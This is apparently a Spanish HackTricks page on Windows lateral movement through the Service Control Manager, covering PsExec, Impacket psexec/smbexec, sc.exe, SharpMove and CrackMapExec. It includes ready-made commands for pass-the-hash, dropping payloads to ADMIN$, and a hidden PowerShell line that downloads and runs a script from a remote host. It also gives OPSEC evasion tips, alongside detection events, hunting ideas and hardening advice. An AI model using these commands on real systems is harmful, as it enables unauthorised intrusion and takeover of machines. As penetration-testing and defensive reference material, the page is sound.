# Ejecución remota de servicios (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Cómo funcionan

Estas técnicas abusan del Windows Service Control Manager (SCM) de forma remota a través de SMB/RPC para ejecutar comandos en un host objetivo. El Service Control Manager Remote Protocol (SCMR) es la interfaz basada en RPC para configurar y controlar servicios de Windows en un equipo remoto. Con permisos suficientes, un operador puede crear o reconfigurar un servicio cuya ruta binaria contenga un comando y luego iniciar ese servicio para ejecutarlo de forma remota.<sup>[[5]](#references)</sup> El flujo habitual es:

1. Autenticarse en el objetivo a través de SMB/RPC (TCP/445); acceder al recurso compartido ADMIN$ si la variante elegida necesita preparar un archivo o recuperar allí la salida.
2. Copiar un ejecutable o especificar una línea de comandos LOLBAS que ejecutará el servicio.
3. Crear un servicio de forma remota a través de SCM (MS-SCMR por \PIPE\svcctl) que apunte a ese comando o binario.
4. Iniciar el servicio para ejecutar el payload y, opcionalmente, capturar stdin/stdout mediante una named pipe.
5. Detener el servicio y limpiar (eliminar el servicio y cualquier binario colocado).

Requisitos/prerrequisitos:
- Administrador local en el objetivo (SeCreateServicePrivilege) o derechos explícitos para crear servicios en el objetivo.
- SMB (445) accesible y Remote Service Management permitido a través del firewall del host; ADMIN$ debe estar disponible en las variantes que lo usan para preparar un archivo o recuperar la salida.
- UAC Remote Restrictions: con cuentas locales, el filtrado de tokens puede bloquear el acceso de administrador por red, salvo que se use la cuenta integrada Administrator o LocalAccountTokenFilterPolicy=1.
- Kerberos frente a NTLM: usar un hostname/FQDN permite Kerberos; conectarse mediante IP suele recurrir a NTLM (y puede estar bloqueado en entornos reforzados).

Si no se especifica una cuenta de servicio, `CreateService` usa `LocalSystem`, que tiene amplios privilegios locales. Esto explica el gran impacto de una ejecución SCM exitosa. No deshabilita UAC ni Microsoft Defender de forma inherente: quien realiza la llamada sigue necesitando derechos SCM remotos, y los controles del endpoint pueden inspeccionar o bloquear el servicio o el payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec manual mediante sc.exe

A continuación se muestra un enfoque mínimo para crear un servicio. La imagen del servicio puede ser un EXE colocado o un LOLBAS como cmd.exe o powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notas:
- Espera un error de tiempo de espera al iniciar un EXE que no sea un servicio; la ejecución se lleva a cabo de todos modos.
- Para ser más favorable para OPSEC, prefiere comandos fileless (cmd /c, powershell -enc) o elimina los artifacts dejados.

Encuentra pasos más detallados en: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Herramientas y ejemplos

### Sysinternals PsExec.exe

- Herramienta clásica de administración que usa SMB para dejar PSEXESVC.exe en ADMIN$, instala un servicio temporal (nombre predeterminado: PSEXESVC) y redirige la entrada/salida mediante named pipes.
- Ejemplos de uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Puedes iniciarlo directamente desde Sysinternals Live mediante WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Deja eventos de instalación/desinstalación del servicio (el nombre del servicio suele ser PSEXESVC, salvo que se use -r) y crea C:\Windows\PSEXESVC.exe durante la ejecución.

### Impacket psexec.py (similar a PsExec)

- Usa un servicio integrado similar a RemCom. Deposita un binario de servicio transitorio (con un nombre normalmente aleatorio) mediante ADMIN$, crea un servicio (a menudo RemComSvc de forma predeterminada) y canaliza la E/S mediante una tubería con nombre.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

En Kali, los ejemplos de Impacket pueden encontrarse en `/usr/share/doc/python3-impacket/examples/`. Si no se proporciona una contraseña, la herramienta la solicita. La opción `-k` de Impacket solicita autenticación Kerberos en lugar de NTLM y suele usar la caché de credenciales actual o las credenciales proporcionadas.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefactos
- EXE temporal en C:\Windows\ (8 caracteres aleatorios). El nombre del servicio predeterminado es RemComSvc, a menos que se sobrescriba.

### Impacket smbexec.py (SMBExec)

- Crea un servicio temporal que inicia cmd.exe y usa una tubería con nombre para la E/S. Por lo general, evita dejar una carga útil EXE completa; la ejecución de comandos es semiinteractiva.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa varios métodos de lateral movement, incluido exec basado en servicios.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) admite la ejecución remota autenticada mediante SCM y varios otros mecanismos de Windows, incluida la modificación o creación de servicios.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- También puedes usar CrackMapExec para ejecutar mediante distintos backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec con SharpMove

La acción SCM crea un servicio llamado `WindowsDebug` y lo apunta a un payload que ya está presente en el host remoto.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, detección y artefactos

Artefactos habituales en el host/red al usar técnicas similares a PsExec:
- Security 4624 (Logon Type 3) y 4672 (Special Privileges) en el destino para la cuenta de administrador usada.
- Security 5140/5145 File Share y File Share Detailed muestran el acceso a ADMIN$ y la creación/escritura de binarios de servicio (p. ej., PSEXESVC.exe o un .exe aleatorio de 8 caracteres).
- **System** 7045 de Service Control Manager para la instalación del servicio en el destino: nombres como PSEXESVC, RemComSvc o personalizados (`-r` / `-service-name`). Esto demuestra que se instaló un servicio, no que se ejecutara su imagen. Correlaciona la marca de tiempo y la ruta de la imagen con eventos de procesos o con una entrada de prefetch coincidente de la imagen del servicio, si está disponible.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) para services.exe o la imagen del servicio, 3 (Network Connect), 11 (File Create) en C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalentes aleatorios.
- Artefacto del registro para el EULA de Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 en el host del operador (si no se ha suprimido).

Ideas para la búsqueda
- Genera alertas sobre instalaciones de servicios cuyo ImagePath incluya cmd.exe /c, powershell.exe o ubicaciones TEMP.
- Busca creaciones de procesos cuyo ParentImage sea C:\Windows\PSEXESVC.exe o procesos secundarios de services.exe que se ejecuten como LOCAL SYSTEM y ejecuten shells.
- Marca pipes con nombre que terminen en -stdin/-stdout/-stderr o que tengan nombres de pipes conocidos de clones de PsExec.

## Solución de problemas comunes
- Access is denied (5) al crear servicios: no se tienen realmente privilegios de administrador local, hay restricciones de UAC remoto para cuentas locales o protección contra manipulaciones de EDR en la ruta del binario del servicio.
- The network path was not found (53) o no se pudo conectar a ADMIN$: el firewall bloquea SMB/RPC o los recursos compartidos administrativos están deshabilitados.
- Kerberos falla, pero NTLM está bloqueado: conéctate usando el nombre de host/FQDN (no la IP), asegúrate de que los SPN sean correctos o proporciona -k/-no-pass con tickets al usar Impacket.
- Se agota el tiempo de espera al iniciar el servicio, pero el payload se ejecutó: es lo esperado si no se trata de un binario de servicio real; captura la salida en un archivo o usa smbexec para obtener I/O en tiempo real.

## Notas de hardening
- Windows 11 24H2 y Windows Server 2025 requieren SMB signing de forma predeterminada para las conexiones salientes (y las entrantes en Windows 11). Esto no interfiere con el uso legítimo de PsExec con credenciales válidas, pero impide el abuso de SMB relay sin firma y puede afectar a dispositivos que no admitan la firma.<sup>[[2]](#references)</sup>
- El nuevo bloqueo de NTLM del cliente SMB (Windows 11 24H2/Server 2025) puede impedir el fallback a NTLM al conectarse por IP o a servidores que no usan Kerberos. En entornos reforzados, esto interrumpirá PsExec/SMBExec basado en NTLM; usa Kerberos (nombre de host/FQDN) o configura excepciones si es necesario por motivos legítimos.<sup>[[2]](#references)</sup>
- Principio de mínimo privilegio: reduce al mínimo la pertenencia al grupo de administradores locales, prefiere Just-in-Time/Just-Enough Admin, aplica LAPS y supervisa/genera alertas para las instalaciones de servicios 7045.

## Véase también

- Ejecución remota basada en WMI (a menudo con menos archivos):

{{#ref}}
./wmiexec.md
{{#endref}}

- Ejecución remota basada en WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Refuerzo de la seguridad de SMB en Windows Server 2025 y Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usar credenciales para tomar el control de equipos Windows: Parte 2 (PSExec y servicios)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft: Solucionar reinicios inesperados mediante los registros de eventos del sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications: descripción general del protocolo remoto Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn: cuenta LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn: función `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
